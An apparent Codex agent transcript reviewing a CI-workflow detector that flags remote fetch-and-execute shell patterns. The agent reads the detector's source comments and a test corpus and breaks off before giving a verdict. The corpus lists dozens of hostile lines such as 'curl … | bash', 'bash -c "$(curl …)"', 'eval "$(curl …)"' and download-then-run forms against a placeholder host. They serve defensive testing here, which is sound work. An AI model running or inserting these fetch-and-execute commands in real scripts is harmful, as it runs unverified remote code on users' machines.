Reading additional input from stdin...
2026-05-30T19:09:45.087648Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
OpenAI Codex v0.133.0
--------
workdir: /Users/amattas/GitHub/aviato
model: gpt-5.5
provider: openai
approval: never
sandbox: read-only
reasoning effort: xhigh
reasoning summaries: none
session id: 019e7a4a-d504-7021-b8ca-4a11de0e180d
--------
user
FINAL confirmation pass on aviato/plugins/actionpins.py `fetch_execute_violations` at git HEAD (commit cb13d57). Two detector changes were JUST made: (1) `_is_interpreter` now resolves the PROGRAM through wrappers (+ wrapper-present fallback to any-word) instead of matching any word — fixing the `grep bash -e"$(curl)"` FP; (2) a shell's static `-c`/`-e` STRING operand is now recursively scanned as shell (`bash -c 'curl|bash'` flags), depth-guarded, and `python/perl/ruby -c` is NOT re-parsed.

Determine if these two changes introduced a NEW regression: (a) a wrapper-hidden interpreter that NOW fails open because resolved-program missed it (try sudo/env/timeout/nice/stdbuf/nohup + bash -c "$(curl)"), or (b) a NEW false positive from the recursive `-c` scan (a benign/data `bash -c '...'` that wrongly flags), or (c) the `-c` recursion mis-handling python/ruby/perl (re-parsing their code as shell).

DOCUMENTED out-of-scope (do NOT report): heredoc-body, ${X:-$(curl)}, dynamic $CMD, block-level verify imprecision, templated quoted run key, conservative FPs (curl|tar, curl|...|tee, time... unparsed). 

Read actionpins.py + tests/core/test_fetch_execute.py. Confirm EVERY claim with `PYTHONPATH=. python3 -c` probes. VERDICT: did cb13d57's two changes introduce a regression, or is the detector STABLE? Be blunt, state confidence.
2026-05-30T19:09:54.637434Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
codex
I’ll do this as a read-only confirmation pass against the current checkout, and I’ll keep the boundary tight around `fetch_execute_violations`, the two recent detector changes, and probe-backed behavior.
exec
/bin/zsh -lc 'rg -n "actionpins|fetch_execute|test_fetch_execute|cb13d57|wrapper|interpreter" /Users/amattas/.codex/memories/MEMORY.md' in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
196:- `scripts/audit-repos.sh` and `scripts/apply-rulesets.sh` are compatibility wrappers around `python3 -m aviato.cli ...`; the Python CLI is the durable surface, not the shell wrappers [Task 2]
239:- On this machine `bnpython3` is the Binary Ninja app wrapper and must be invoked with `-m MODULE_NAME`; CPython-style `-c` or stdin scripts fail [Task 1]
242:- Some apparent function clusters are split starts or branch bodies, not real top-level logic. Examples already cleaned: the external boot-session wrapper cluster at `0x80001d48..0x80001ea4`, `run_network_migration_second_stage` branch starts, and `process_comm_packet_record_inbound_packet` branch starts [Task 1][Task 2]
249:- Symptom: `bnpython3` rejects the command line with `Unknown option '-c'` or ignores stdin -> cause: it is the Binary Ninja wrapper, not plain CPython -> invoke helper modules with `bnpython3 -m ...` [Task 1]

exec
/bin/zsh -lc 'git rev-parse --short HEAD && git rev-parse HEAD && git status --short && git branch --show-current' in /Users/amattas/GitHub/aviato
 succeeded in 5002ms:
2026-05-30 15:09:59.624 xcodebuild[73567:39947892]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:09:59.804 xcodebuild[73567:39947891] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-LxySP6Ed' (errno=Operation not permitted)
2026-05-30 15:10:00.168 xcodebuild[73569:39947902]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:00.268 xcodebuild[73569:39947901] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
cb13d57
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-xzHjZOXy' (errno=Operation not permitted)
2026-05-30 15:10:00.990 xcodebuild[73575:39947943]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:01.091 xcodebuild[73575:39947942] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-CF7aREqD' (errno=Operation not permitted)
2026-05-30 15:10:01.401 xcodebuild[73577:39947957]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:01.502 xcodebuild[73577:39947956] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
cb13d572b429ef26d0e0bb4e5914320869ecb0ee
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-FM38vaPV' (errno=Operation not permitted)
2026-05-30 15:10:02.209 xcodebuild[73583:39947983]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:02.312 xcodebuild[73583:39947982] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-Gx9z4kxr' (errno=Operation not permitted)
2026-05-30 15:10:02.616 xcodebuild[73585:39947997]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:02.720 xcodebuild[73585:39947996] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-XgELht3e' (errno=Operation not permitted)
2026-05-30 15:10:03.423 xcodebuild[73589:39948016]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:03.525 xcodebuild[73589:39948015] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
git: warning: confstr() failed with code 5: couldn't get path of DARWIN_USER_TEMP_DIR; using /tmp instead
git: error: couldn't create cache file '/tmp/xcrun_db-6Y1DK0Rs' (errno=Operation not permitted)
2026-05-30 15:10:03.833 xcodebuild[73592:39948027]  DVTFilePathFSEvents: Failed to start fs event stream.
2026-05-30 15:10:03.929 xcodebuild[73592:39948026] [MT] DVTDeveloperPaths: Failed to get length of DARWIN_USER_CACHE_DIR from confstr(3), error = Error Domain=NSPOSIXErrorDomain Code=5 "Input/output error". Using NSCachesDirectory instead.
feat/python-container-service

2026-05-30T19:10:05.665971Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
2026-05-30T19:10:15.497641Z ERROR codex_models_manager::manager: failed to refresh available models: timeout waiting for child process to exit
codex
HEAD is `cb13d57` on `feat/python-container-service`; the worktree status command produced no tracked changes. I’m reading the detector and focused tests next, then I’ll run direct `python3 -c` probes for each regression class.
exec
/bin/zsh -lc "rg -n \"def fetch_execute_violations|_is_interpreter|interpreter|wrapper|static|\\-c|\\-e|shlex|curl|wget|fetch\" aviato/plugins/actionpins.py" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
42:# §11.3 fetch-execute detection — built on REAL parsers (PyYAML for `run:` extraction, bashlex for the
44:# checksum-word+sink, cycle-11 regex-split taint, cycle-12 "coarse", cycle-13 the first bashlex walk —
47:# substitutions, command wrappers, quoted/flow `run:` keys). The convergent lesson (both engines):
53:# The rule: a `curl`/`wget` is a violation if its output reaches EXECUTION —
55:#   (B) a command/process substitution carrying the fetch is EXECUTED — it is in command position
56:#       (`$(curl) …`) or fed to an interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`,
57:#       `. <(curl)`), or written into `>(interpreter)`, or
60:# Programs are resolved through transparent wrappers (`sudo`/`env`/`timeout …`) so `sudo curl` is a
61:# fetch and `env jq` is a sink; a fetch in a substitution that is only CAPTURED as data (`X=$(curl)`,
62:# `echo "$(curl)"`) is NOT execution and is not flagged — that distinction (interpreter vs data
63:# context) is what keeps the gate usable. A bare fetch to stdout, a pipe into pure sinks only, and
64:# download → verify → use are clean. Fail CLOSED on the undecidable: a block bashlex can't parse, an
65:# unrecognised pipeline element. DOCUMENTED out-of-scope (best-effort gate for HONEST mistakes — NOT a
66:# complete control against an author obfuscating their own CI; a precise static "do fetched bytes reach
68:# (`bash <<EOF … $(curl) … EOF`), parameter-default obfuscation (`${X:-$(curl)}`), dynamic command
69:# words (`$CMD`/`sh -c "bash $f"`), and a quoted/flow `run:` key inside a TEMPLATED (non-YAML) scaffold
74:# checksum/setup names the artifact before the verifier (`printf … tool | sha256sum -c -`). Convergent
76:_FETCH_RE = re.compile(r"\b(?:curl|wget)\b")  # cheap pre-filter only; the real check is the AST walk
77:_FETCH_NAMES = frozenset({"curl", "wget"})
79:# redirect) write a file. Deliberately EXCLUDES sort (`--compress-program=CMD` executes, cycle-12
80:# C12-9), less/more (shell escapes), awk/sed (`-f`/`-e`), xargs, tee (writes a file), and every shell.
82:# Transparent wrappers peeled to resolve a command's real program: `sudo curl`/`env curl`/`timeout 5
83:# curl` are fetches, `env jq` is a sink. Resolving by program position (not "any word") also stops a
84:# literal `curl`/`wget` ARGUMENT (`grep curl`) being mistaken for a fetch.
95:# code flag. A fetch substitution flags as executed only in a CODE position, never as a data arg to a
96:# script (`python report.py "$(curl)"`), so the interpreter rule stays usable (cycle-13 R4).
98:_CODE_FLAGS = frozenset({"-c", "-e", "-E", "--command", "--eval"})  # operand is code, not a filename
99:_CODE_FLAG_PREFIXES = ("-c", "-e", "-E", "--command=", "--eval=")  # a GLUED code operand: `-c"$(curl)"`
100:_MAX_SHELL_DEPTH = 4  # recursion guard for `bash -c '… bash -c "…" …'` nesting (cycle-15)
114:    so it can add flags, never remove them (fail-closed safe). Used by the pip-pin scan only."""
128:    scalars — so none can hide a `curl|bash` from the gate the way a line regex let them (cycle-13
157:    except Exception:  # noqa: BLE001 — not valid YAML (templated scaffold) → line-extractor fallback
212:    """Every child AST node, regardless of the attribute that holds it. bashlex stores children under
232:    """The basename of a CommandNode's real PROGRAM, peeling transparent wrappers and their operands so
233:    `sudo curl`/`env A=1 curl`/`timeout 5 curl` resolve to `curl`. Resolving by program POSITION (vs
234:    matching any word) keeps `sudo curl` a fetch while a literal `curl` ARGUMENT (`grep curl`) is not."""
244:        while i < len(words) and words[i].startswith("-"):  # skip the wrapper's own flags
255:    """`command -v X` / `type X` / `which X` look a program UP — they neither fetch nor execute it, so
256:    `command -v curl` must not read as a curl fetch (cycle-13 R4)."""
266:def _fetch_tool(node: object) -> str | None:
267:    """'curl'/'wget' if this CommandNode runs one (through wrappers, cycle-13 Group B)."""
273:    # A wrapper whose options take ARGUMENTS (`env -u X curl`, `sudo -u root curl`) can hide the program
274:    # from the position-based resolve. When the command STARTS with a wrapper, fall back to any
275:    # curl/wget word (fail-closed). `grep curl` has no wrapper, so it is unaffected (no false fetch).
284:def _is_interpreter(node: object) -> bool:
285:    """True if the command runs an interpreter (`bash`/`sh`/`eval`/`source`/`.`/`python`/…) — a
287:    wrappers, with a wrapper-present fallback to any interpreter word (mirrors `_fetch_tool`) so
288:    `sudo -u root bash -c …`/`timeout -k 5s 30s bash -c …` are caught WITHOUT misreading a literal
289:    interpreter token in an ordinary command's args (`grep bash -e …`) as an interpreter (cycle-15)."""
299:    """True if the command runs a POSIX shell (`bash`/`sh`/…) — whose `-c` operand is itself shell, vs
300:    `python`/`perl`/`ruby` whose `-c`/`-e` operand is that LANGUAGE's code (never re-parsed as shell)."""
309:def _static_code_operands(node: object) -> list[str]:
310:    """The LITERAL (substitution-free) string operands of a shell's `-c`/`-e` flag. These are shell to be
311:    recursively scanned (`bash -c 'curl | bash'`); an operand carrying a substitution is already handled
312:    by `_interpreter_executes_fetch`, so it is skipped here to avoid double work."""
327:def _subtree_has_fetch(node: object) -> bool:
328:    """True if any CommandNode anywhere in this node's subtree runs curl/wget — so a fetch hidden in a
329:    group/subshell pipeline element (`{ curl; } | bash`) is still seen as a source."""
330:    if _fetch_tool(node):
332:    return any(_subtree_has_fetch(child) for child in _children(node))
341:def _word_has_fetch_subst(word: object) -> bool:
342:    """True if a WORD node carries a command/process substitution whose subtree runs curl/wget
343:    (`"$(curl)"`, `<(curl)`)."""
345:        getattr(p, "kind", None) in ("commandsubstitution", "processsubstitution") and _subtree_has_fetch(p)
350:def _command_position_fetch_subst(node: object) -> bool:
351:    """True if the command-position word is a fetch substitution (`$(curl …) arg` runs the fetched
355:            return _word_has_fetch_subst(part)  # first word is the program position
361:def _interpreter_executes_fetch(node: object) -> bool:
362:    """True if a fetch substitution reaches an interpreter in a CODE position — the operand of `-c`/`-e`,
363:    an `eval`/`source` argument, a shell's first positional (`bash <(curl)`), or its stdin
364:    (`bash <<<"$(curl)"`, `bash < <(curl)`). A fetch passed as a DATA arg to a script
365:    (`python3 report.py "$(curl)"`) is not execution and is not flagged (cycle-13 R4)."""
366:    if not _is_interpreter(node) or _is_introspection(node):
371:    if names & {"eval", "source", "."} and any(_word_has_fetch_subst(p) for p in word_parts):
373:    # a code flag carries the fetch — its SEPARATE operand (`-c "$(curl)"`) OR a GLUED operand
374:    # (`-c"$(curl)"`, which bashlex tokenises as one `-c$(…)` word; cycle-14 R3 fail-open).
376:        if part.word in _CODE_FLAGS and i + 1 < len(word_parts) and _word_has_fetch_subst(word_parts[i + 1]):
378:        if part.word.startswith(_CODE_FLAG_PREFIXES) and _word_has_fetch_subst(part):
380:    # a shell runs its FIRST positional as a script (`bash <(curl)`); later words are its data args.
385:            if _word_has_fetch_subst(part):
388:    # stdin fed to the interpreter is code (`bash <<<"$(curl)"`, `bash < <(curl)`, `xargs sh < <(curl)`).
392:            if out is not None and _word_has_fetch_subst(out):
397:def _redirects_to_interpreter_procsub(node: object) -> bool:
399:    interpreter (`curl … > >(bash)`, `… | cat > >(bash)`) — the bytes are written into a shell."""
404:                if getattr(sub, "kind", None) == "processsubstitution" and _is_interpreter(
430:        return any(w in ("-c", "--check") for w in rest)
440:def _fetch_output_files(node: object, tool: str) -> set[str]:
441:    """Files a curl/wget command writes (a later use of one is "used unverified fetched bytes").
443:    Parses the bounded, stable curl/wget output grammar — `-o`/`--output`(`=`)`, the curl `-O`/
444:    `--remote-name` and clustered/glued `-fsSLo FILE`/`-oFILE` forms, the wget `-O`/`-OFILE`/
445:    `--output-document` forms, `--output-dir`/`-P`/`--directory-prefix` path prefixes, the wget
447:    fail-closed; under-detecting (cycle-13 Group C: `wget -O`, glued `-o`, `--output-dir`) is the bug
448:    this closes. Empty set ⇒ the fetch streams to stdout."""
464:        elif w in ("-o", "--output") and nxt is not None:  # curl output; wget -o is a logfile → fail-closed
470:        elif tool == "wget" and w in ("-O", "--output-document") and nxt is not None:
475:        elif tool == "wget" and w.startswith("--output-document="):
479:        elif tool == "wget" and re.fullmatch(r"-O.+", w):  # glued wget -OFILE / -O=FILE
483:        elif tool == "curl" and w in ("-O", "--remote-name", "--remote-name-all"):
485:        elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*o", w) and nxt is not None:  # cluster -…o FILE
489:        elif tool == "curl" and not w.startswith("--") and re.fullmatch(r"-[a-zA-Z]*o=?.+", w):  # glued -oFILE
491:        elif tool == "curl" and re.fullmatch(r"-[a-zA-Z]*O[a-zA-Z]*", w):  # cluster containing O
494:    # wget writes the remote basename by default unless it streams to stdout.
495:    if tool == "wget" and not files:
510:    """Walks a bashlex AST collecting what's needed to decide §11.3 fetch-execute violations."""
514:        self.downloads: set[str] = set()  # files holding unverified fetched bytes
516:        self.used: set[str] = set()  # words used by non-fetch, non-verifier commands
517:        self.depth: int = depth  # recursion depth into shell `-c` strings (cycle-15)
526:        # of a substitution, walked here so its own fetches are still collected). Never narrow this to
536:            # (A) a fetch's bytes flow into a downstream element. Safe only if EVERY downstream element
540:            if _subtree_has_fetch(element) and any(not _is_pure_sink(d) for d in elements[idx + 1 :]):
541:                self.violations.append("fetch piped into a non-data-sink command")
542:        if any(_subtree_has_fetch(e) for e in elements):
546:                if _redirects_to_interpreter_procsub(element):  # `curl | cat > >(bash)`
547:                    self.violations.append("fetch written into a process substitution running a shell")
548:                # Files written ANYWHERE in a fetch-bearing pipeline (`curl | cat > f`) hold fetched bytes.
549:                tool = _fetch_tool(element)
550:                self.downloads |= _fetch_output_files(element, tool) if tool else _redirect_files(element)
553:        tool = _fetch_tool(node)
555:            if _redirects_to_interpreter_procsub(node):
556:                # `curl … > >(bash)` — the fetch's bytes are written straight into a shell. Execution.
557:                self.violations.append("fetch written into a process substitution running a shell")
558:            self.downloads |= _fetch_output_files(node, tool)
562:            # DOWNLOADS. It does NOT vet a streamed fetch (handled above). Verify handling is deliberately
565:            # checksum names the artifact (`printf "%s  %s" "$SHA" tool | sha256sum -c -`) or whose setup
571:        # (B) a fetch substitution that is EXECUTED — run as the command (`$(curl) …`) or fed to an
572:        # interpreter (`bash -c "$(curl)"`, `bash <(curl)`, `bash <<<"$(curl)"`). A substitution merely
573:        # CAPTURED as data (`X=$(curl)`, `echo "$(curl)"`) is not flagged — that is what keeps the gate
574:        # usable on the dominant "fetch a value" pattern.
575:        if _command_position_fetch_subst(node):
576:            self.violations.append("fetch substitution run as a command")
577:        elif _interpreter_executes_fetch(node):
578:            self.violations.append("fetch substitution executed by an interpreter")
579:        # cycle-15: a shell's static `-c`/`-e` STRING operand is itself shell — recursively scan it so
580:        # `bash -c 'curl | bash'` (literal code, not a substitution) is not a fail-open. Depth-guarded.
582:            for operand in _static_code_operands(node):
584:                    self.violations.append(f"shell -c string: {reason}")
608:    """Parse one shell block and return its fetch-execute violation reasons. Recursive: a shell's static
609:    `-c`/`-e` string operand IS more shell, so it is scanned at ``depth+1`` (cycle-15: `bash -c 'curl |
610:    bash'` is a literal code string, not a substitution). A block that mentions curl/wget but bashlex
612:    import bashlex
617:        trees = bashlex.parse(block)
634:def fetch_execute_violations(text: str) -> list[str]:
635:    """Fail-closed §11.3 fetch-execute check over a real shell AST (design contract above).
637:    For each ``run:`` block: parse it with bashlex and walk the AST. A `curl`/`wget` is flagged when
639:    unverified / a shell `-c` string that itself fetch-executes)."""
644:            violations.append(f"fetch-and-execute without checksum: {reasons[0]}")
654:# real index package (vs a path/URL/var) so a NON-exact spec can still be reported by name.
664:    name (`build`) AND a non-exact specifier (`foo>=1.0`, `foo~=1.0`, the wildcard `foo==1.*`)
667:    (`.`/`.[extra]`/`-e <path>`), requirements/constraints files, VCS (`git+…`), built wheels
690:        if stripped in ("-r", "--requirement", "-c", "--constraint"):
693:        if stripped.startswith("-"):  # any other flag (-e, --quiet, --upgrade, …)
716:        # Bare name or a non-exact specifier (>=, ~=, <=, !=, ==1.*) → not exactly pinned.
727:    supply-chain surface, but the ``-r <file>`` reference is (correctly) skipped by the package
729:    to the gate and let CI silently pull an untested newer tool (§11.3). Each non-comment line is a
742:    """Shell-invoked tools not pinned (§11.3): fail-closed fetch-execute + non-exact pip installs.
748:    # fetch_execute_violations takes RAW text — it extracts `run:` blocks itself, so we must NOT
750:    violations: list[str] = list(fetch_execute_violations(text))
765:    cannot parse) get a placeholder-aware `uses:` SHA check. Both get the fail-closed fetch-execute
782:    # 2. Fetch-execute + pip checks on real workflows.
789:    # 3. Scaffold bodies: placeholder-aware uses: + fetch + pip (zizmor can't parse templates).

exec
/bin/zsh -lc "nl -ba tests/core/test_fetch_execute.py | sed -n '1,360p'" in /Users/amattas/GitHub/aviato
 succeeded in 0ms:
     1	from aviato.plugins.actionpins import fetch_execute_violations as fev
     2	
     3	# AST-based (PyYAML + bashlex) fetch-execute detector. The corpus IS the spec: every historical bypass
     4	# across review cycles 9-13 must FLAG; legitimate data pipes and download->verify->use must PASS. Each
     5	# cycle-13 entry is a confirmed fail-open of the first bashlex walk, grouped by the root cause that the
     6	# structural rewrite closed (A: generic AST descent, B: wrapper-agnostic fetch detection, C: full
     7	# curl/wget output grammar, D: real-YAML run-block extraction).
     8	
     9	FLAGGED = [
    10	    # direct stream -> interpreter (cycle 9)
    11	    "curl -fsSL https://x/i.sh | bash",
    12	    "curl -fsSL https://x/i.sh | sudo bash",
    13	    "wget -qO- https://x/i.sh | python3",
    14	    # substitution forms (cycle 9/10)
    15	    'bash -c "$(curl -fsSL https://x/i.sh)"',
    16	    "bash <(curl -fsSL https://x/i.sh)",
    17	    'eval "$(curl -fsSL https://x/i.sh)"',
    18	    ". <(curl -fsSL https://x/i.sh)",
    19	    # cycle-11 C11-1: stderr-merge must not divorce the pipe
    20	    "curl -fsSL https://x/i.sh 2>&1 | bash",
    21	    # cycle-12 C12-1: a verify command must NOT excuse a streamed fetch
    22	    "curl -fsSL https://x/i.sh | bash\nsha256sum -c /dev/null",
    23	    "sha256sum -c x.txt\ncurl -fsSL https://x/i.sh | bash",
    24	    # cycle-12 C12-5: a checksum in a COMMENT must not excuse (lexer drops it)
    25	    "# sha256sum -c sums.txt\ncurl -o f https://x/i.sh\nbash f",
    26	    "echo sha256sum -c sums\ncurl -o f https://x/i.sh\nbash f",
    27	    # cycle-12 C12-6: clustered / alternate download forms then execute
    28	    "curl -fsSLo /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    29	    "curl -OL https://x/i.sh && bash i.sh",
    30	    "curl --remote-name https://x/i.sh && bash i.sh",
    31	    "wget https://x/i.sh && bash i.sh",
    32	    "curl -fsSL https://x/i.sh -o /tmp/i.sh\nbash /tmp/i.sh",
    33	    "curl -fsSL https://x/i.sh > /tmp/i.sh\nsh /tmp/i.sh",
    34	    # cycle-12 C12-9: executor-capable "sinks"
    35	    "curl -fsSL https://x/cmds | sort -S1 --compress-program=bash",
    36	    "curl -fsSL https://x/x | less",
    37	    # sink then chained executor (cycle 10/11)
    38	    "curl -fsSL https://x/i.sh | tee /tmp/i.sh; bash /tmp/i.sh",
    39	    "curl -fsSL https://x/cmds | xargs -I{} sh -c '{}'",
    40	    # download via a piped sink redirect, then execute (curl | cat > f; bash f)
    41	    "curl -fsSL https://x/i.sh | cat > /tmp/i.sh\nbash /tmp/i.sh",
    42	    # --- cycle-13 Group A: compound / subshell / loop bodies + redirect-target substitutions ---
    43	    # (the first bashlex walk descended only named attrs, so these whole subtrees were invisible)
    44	    "curl -fsSL https://x/i.sh | { bash; }",
    45	    "curl -fsSL https://x/i.sh | ( bash )",
    46	    "curl -fsSL https://x/cmds | while read l; do $l; done",
    47	    "{ curl -fsSL https://x/i.sh | bash; }",
    48	    "( curl -fsSL https://x/i.sh | bash )",
    49	    "( curl -fsSL https://x/i.sh -o f ); bash f",
    50	    "{ curl -fsSL https://x/i.sh; } | bash",
    51	    "( curl -fsSL https://x/i.sh ) | bash",
    52	    "if true; then curl -fsSL https://x/i.sh; fi | bash",
    53	    "while true; do curl -fsSL https://x/i.sh; break; done | bash",
    54	    "for x in 1; do curl -fsSL https://x/i.sh; done | bash",
    55	    'bash <<< "$(curl -fsSL https://x/i.sh)"',
    56	    "bash < <(curl -fsSL https://x/i.sh)",
    57	    "sh -s < <(curl -fsSL https://x/i.sh)",
    58	    "source < <(curl -fsSL https://x/i.sh)",
    59	    "curl -fsSL https://x/i.sh > >(bash)",
    60	    # --- cycle-13 Group B: transparent command wrappers must not hide the fetch ---
    61	    "sudo curl -fsSL https://x/i.sh | bash",
    62	    "env curl -fsSL https://x/i.sh | bash",
    63	    "command curl -fsSL https://x/i.sh | bash",
    64	    # --- cycle-13 Group C: output forms the option parser missed ---
    65	    "wget -O /tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    66	    "wget -O/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    67	    "curl -o/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    68	    "curl -o=/tmp/i.sh https://x/i.sh && bash /tmp/i.sh",
    69	    "wget -P /tmp https://x/i.sh && bash /tmp/i.sh",
    70	    "wget --directory-prefix=/tmp https://x/i.sh && bash /tmp/i.sh",
    71	    "curl --output-dir /tmp -O https://x/i.sh && bash /tmp/i.sh",
    72	    "curl --output-dir=/tmp -O https://x/i.sh && bash /tmp/i.sh",
    73	    # --- cycle-13 R2: honest fail-opens the first structural walk still missed ---
    74	    "curl -fsSLo f https://x/i.sh\nbash < f",  # downloaded file executed via a `<` stdin redirect
    75	    "curl -fsSLo install.sh https://x/i.sh\nbash ./install.sh",  # `./name` must match downloaded `name`
    76	    "curl -fsSL https://x/i.sh | cat > >(bash)",  # pure sink writes into >(interpreter)
    77	    "$(curl -fsSL https://x/cmd)",  # fetch substitution in command position is executed
    78	    # --- cycle-13 R4: wrappers whose options take ARGUMENTS must not hide the interpreter/fetch ---
    79	    'sudo -u root bash -c "$(curl -fsSL https://x/i.sh)"',
    80	    'env -u BASH_ENV bash -c "$(curl -fsSL https://x/i.sh)"',
    81	    'timeout -k 5s 30s bash -c "$(curl -fsSL https://x/i.sh)"',
    82	    "env -u X curl -fsSL https://x/i.sh | bash",
    83	    # --- cycle-14 R3: a GLUED code operand (`-c"$(curl)"`, no space) is still executed ---
    84	    'bash -c"$(curl -fsSL https://x/i.sh)"',
    85	    'python3 -c"$(curl -fsSL https://x/i.py)"',
    86	    'perl -e"$(curl -fsSL https://x/i.pl)"',
    87	    # --- cycle-15: a shell's static `-c` STRING operand is itself shell (recursively scanned) ---
    88	    "bash -c 'curl -fsSL https://x/i.sh | bash'",
    89	    "sh -c 'set -e; curl -fsSL https://x/i.sh | bash'",
    90	    "sudo bash -c 'curl -fsSL https://x/i.sh | bash'",
    91	]
    92	
    93	ALLOWED = [
    94	    "curl -fsSL https://x/v.json | jq .version",
    95	    "curl -fsSL https://x/r.txt | grep tag_name",
    96	    "curl -fsSL https://x/r.txt | grep x | head -1",
    97	    "curl -fsSL https://x/f",  # bare fetch to stdout, goes nowhere
    98	    # download -> verify -> use (a real verify command vets the download)
    99	    "curl -fsSL https://x/i.sh -o f && sha256sum -c sums.txt && bash f",
   100	    "curl -fsSL https://x/i.sh -o f\nsha256sum -c sums.txt\nbash f",
   101	    # the actionlint install shape (checksum piped from echo)
   102	    'curl -sSL https://x/a.tgz -o t.tgz\necho "$SHA  t.tgz" | sha256sum -c -\ntar -xz -f t.tgz\nactionlint',
   103	    # cosign-verified download
   104	    "curl -fsSL https://x/app -o app\ncosign verify-blob --signature s app\n./app",
   105	    # --- cycle-13 R2: data-capture is NOT execution (interpreter-aware rule (B)); these MUST pass or
   106	    # the gate is too noisy to use — fetching a value into a variable/output is the dominant pattern ---
   107	    "VERSION=$(curl -s https://api/releases/latest | jq -r .tag_name)",
   108	    "X=$(curl -fsSL https://x/v.txt)",
   109	    'export V="$(curl -fsSL https://x/v.txt)"',
   110	    'echo "v=$(curl -s https://x/v)" >> "$GITHUB_OUTPUT"',
   111	    "curl -fsSL https://x/v.json | env jq .version",  # wrapped pure sink resolves through `env`
   112	    'echo "$(curl -fsSL https://x/v.json)" | jq .version',  # substitution into a non-interpreter = data
   113	    'grep curl README.md | sed "s/curl/CURL/"',  # a literal `curl` ARGUMENT is not a fetch command
   114	    "diff <(curl -fsSL https://x/a) <(curl -fsSL https://x/b)",  # two fetches compared as data
   115	    # --- cycle-13 R4: precise interpreter/introspection/path rules must not over-flag ---
   116	    "command -v curl | tee curl-path.txt",  # `command -v` looks curl UP, it is not a fetch
   117	    'python3 tools/report.py "$(curl -fsSL https://x/data.json)"',  # fetch is a DATA arg to a script, not -c
   118	    "curl -fsSLo /tmp/data.json https://x/data.json\njq . ./fixtures/data.json",  # same basename, different dirs
   119	    # --- cycle-14 R1: a verify-manifest pipeline NAMES the artifact; it is not a use-before-verify.
   120	    # Verify is BLOCK-LEVEL (an order-aware attempt was reverted — it FP'd these), so a checksum that
   121	    # names/sets-up the artifact in any order still vets the block. ---
   122	    'curl -fsSLo tool https://x/tool\nprintf "%s  %s\\n" "$SHA256" tool | sha256sum -c -\nchmod +x tool\n./tool',
   123	    "curl -fsSLo tool https://x/tool\nchmod +x tool\nsha256sum -c sums.txt\n./tool",  # setup-before-verify
   124	    # DOCUMENTED residual (block-level verify): a verify AFTER the use still vets — accepted fail-open
   125	    # (contrived honest mistake) in exchange for zero FPs on the common verified-install shapes above.
   126	    "curl -fsSLo install.sh https://x/i.sh\nbash install.sh\nsha256sum -c sums.txt",
   127	    # --- cycle-15: a literal interpreter token in an ordinary command's args is not an interpreter, and
   128	    # a non-shell -c operand (python/perl code) is that language, not shell — neither over-flags ---
   129	    'grep bash -e "$(curl -fsSL https://x/p)" file',  # grep is the program; `bash` is a search term
   130	    "bash -c 'curl -fsSL https://x/v | jq .'",  # static -c string is a DATA pipe
   131	    "python3 -c 'import os; os.system(\"echo hi\")'",  # python -c is python code, never re-parsed as shell
   132	]
   133	
   134	
   135	def test_flags_every_historical_bypass():
   136	    for line in FLAGGED:
   137	        assert fev(line), f"fail-open miss: {line!r}"
   138	
   139	
   140	def test_allows_data_pipes_and_verified_installs():
   141	    for line in ALLOWED:
   142	        assert fev(line) == [], f"false positive: {line!r}"
   143	
   144	
   145	def test_only_run_blocks_scanned_not_metadata():
   146	    wf = (
